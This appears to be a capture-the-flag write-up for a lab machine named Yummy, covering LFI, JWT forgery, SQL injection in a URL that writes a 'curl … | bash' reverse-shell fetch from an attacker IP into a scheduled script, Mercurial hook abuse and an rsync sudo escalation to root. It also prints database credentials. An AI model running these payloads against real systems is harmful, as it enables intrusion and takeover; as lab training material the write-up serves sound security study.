<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Yummy</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Yummy</h1><br/><p>Portscan</p><p></p><p>	<strong>nmap -sVC -p- --open -sS --min-rate 5000 -v -n --stats-every=5s -Pn -oN yummy_scan &lt;IP&gt;</strong></p><p></p><p></p><p><img src="images/134-1.png" alt="images/134-1.png" /></p><p></p><p>On the main page there is a Login and a Register</p><p></p><p><img src="images/134-2.png" alt="images/134-2.png" /></p><p></p><p>whatweb for see technologies</p><p> </p><p>	<strong><a href="http://yummy.htb/">http://yummy.htb/</a></strong><strong> [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@yummy.htb], Frame, HTML5, HTTPServer[Caddy], IP[10.10.11.36], Lightbox, Script, Title[Yummy]</strong></p><p></p><p>I register my username</p><p></p><p><img src="images/134-3.png" alt="images/134-3.png" /></p><p></p><p>I reserve a table</p><p></p><p><img src="images/134-4.png" alt="images/134-4.png" /></p><p></p><p>We intercept the request EXPORT</p><p></p><p>I see that it is vulnerable to LFI</p><p></p><p><img src="images/134-5.png" alt="images/134-5.png" /></p><p></p><p><img src="images/134-6.png" alt="images/134-6.png" /></p><p></p><p>ANOTHER METHOD</p><p></p><p>Intercept the JWT by intercepting the login REQUEST by accessing /admindashboard</p><p></p><p>Decoded the Token <a href="https://jwt.io/">https://jwt.io/</a></p><p></p><p><img src="images/134-7.png" alt="images/134-7.png" /></p><p></p><p>There is a vulnerability in variable n </p><p></p><p><img src="images/134-8.png" alt="images/134-8.png" /></p><p></p><p>I create a JWT as an admin</p><p></p><p><img src="images/134-9.png" alt="images/134-9.png" /></p><p></p><p>I change it in the REQUEST I intercepted and access the dashboard as an admin</p><p></p><p><img src="images/134-10.png" alt="images/134-10.png" /></p><p></p><p>Within app_backup.sh a zip is mentioned in /var/www/backupapp.zip</p><p></p><p><img src="images/134-11.png" alt="images/134-11.png" /></p><p></p><p><img src="images/134-12.png" alt="images/134-12.png" /></p><p></p><p>We download this file and it gives us the creds of the db</p><p><img src="images/134-13.png" alt="images/134-13.png" /></p><p></p><p>	db_config = {</p><p>		&#39;host&#39;: &#39;127.0.0.1&#39;,</p><p>		&#39;user&#39;: &#39;chef&#39;,</p><p>		&#39;password&#39;: &#39;3wDo7gSRZIwIHRxZ!&#39;,</p><p>		&#39;database&#39;: &#39;yummy_db&#39;,</p><p>		&#39;cursorclass&#39;: pymysql.cursors.DictCursor,</p><p>		&#39;client_flag&#39;: CLIENT.MULTI_STATEMENTS</p><p></p><p>	}</p><p></p><p>The URL may be vulnerable to a SQLI</p><p></p><p><img src="images/134-14.png" alt="images/134-14.png" /></p><p></p><p><img src="images/134-15.png" alt="images/134-15.png" /></p><p>URL INJECTION<h3>: </h3><h3>http://yummy.htb/admindashboard?s=aa&amp;o=ASC%3B++select+&quot;ping%3B&quot;+INTO+OUTFILE++&#39;/data/scripts/dbstatus.json&#39;+%3B</h3><h3>  </h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h3>http://yummy.htb/admindashboard?s=aa&amp;o=ASC%3B++select+&quot;curl+10.10.X.X/reverse.sh+|bash%3B&quot;+INTO+OUTFILE++&#39;/data/scripts/fixer-v___&#39;+%3B</h3></p><p></p><p><img src="images/134-16.png" alt="images/134-16.png" /></p><p></p><p><img src="images/134-17.png" alt="images/134-17.png" /></p><p></p><p>Now we&#39;re like the mysql user</p><p></p><p>To pass on to the user www-data we create a reverse shell and rename it as app_backup.sh</p><p></p><p><img src="images/134-18.png" alt="images/134-18.png" /></p><p></p><p><img src="images/134-19.png" alt="images/134-19.png" /></p><p></p><p>reverse obtained as www-data</p><p></p><p><img src="images/134-20.png" alt="images/134-20.png" /></p><p></p><p>In the /var/www/ folder we find an interesting directory and .zip so we will start with the foothold</p><p></p><p><img src="images/134-21.png" alt="images/134-21.png" /></p><p></p><p>In the path <strong>/app-qatesting/.hg/store/data</strong> I find the app.py.i file</p><p>Containing the password of the qa user and the chef user</p><p></p><p><img src="images/134-22.png" alt="images/134-22.png" /></p><p></p><p><img src="images/134-23.png" alt="images/134-23.png" /></p><p></p><p></p><p>With qa creds I access the user</p><p></p><p><img src="images/134-24.png" alt="images/134-24.png" /></p><p></p><p>I access the /home/qa/ directory and find the user&#39;s flag</p><p></p><p><img src="images/134-25.png" alt="images/134-25.png" /></p><p></p><p>To have a more secure and stable connection I create a key pair with <strong>ssh-keygen</strong></p><p></p><p><img src="images/134-26.png" alt="images/134-26.png" /></p><p></p><p>I do sudo -l and I see that I can execute a comoando as dev</p><p></p><p><img src="images/134-27.png" alt="images/134-27.png" /></p><p></p><p>hg → is the executable for Mercurial, a distributed version control system (similar to git).</p><p></p><p>So escalation I think would be dev → root</p><p></p><p>I access the /tmp folder to be able to create &quot;without restrictions&quot; </p><p>I create the .hg directory, change the persimmis, and copy .hgrc into the .hg directory</p><p></p><p><img src="images/134-28.png" alt="images/134-28.png" /></p><p></p><p><img src="images/134-29.png" alt="images/134-29.png" /></p><p></p><p>Then I modify the hgrc file by making a call to my reverse shell</p><p></p><p><img src="images/134-30.png" alt="images/134-30.png" /></p><p></p><p>Create a revshell.sh in /tmp</p><p></p><p><img src="images/134-31.png" alt="images/134-31.png" /></p><p></p><p><strong>chmod 777 revshell.sh</strong></p><p></p><p>Exeto el comando s<strong>udo -u dev /usr/bin/hg pull /home/dev/app-production/</strong></p><p>And I get the dev shell</p><p></p><p><img src="images/134-32.png" alt="images/134-32.png" /></p><p></p><p>I do sudo -l and see that I can run a command like root</p><p></p><p><strong>(root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/</strong></p><p></p><p><img src="images/134-33.png" alt="images/134-33.png" /></p><p></p><p>What rsync does is make a copy of the directories and files from path A to path B</p><p></p><p>What I do is copy bash within the path in which the copy is made</p><p>and I give setuid (Set User ID) permissions on the file, which allows you to run the file with the owner&#39;s permissions.</p><p></p><p><img src="images/134-34.png" alt="images/134-34.png" /></p><p></p><p>Then I run the command that was mentioned in the sudo -l by changing the file owner to root and making a bash call</p><p></p><p><strong>sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/ &amp;&amp; /opt/app/bash -p</strong></p><p></p><p><img src="images/134-35.png" alt="images/134-35.png" /></p></div>
</body>
</html>
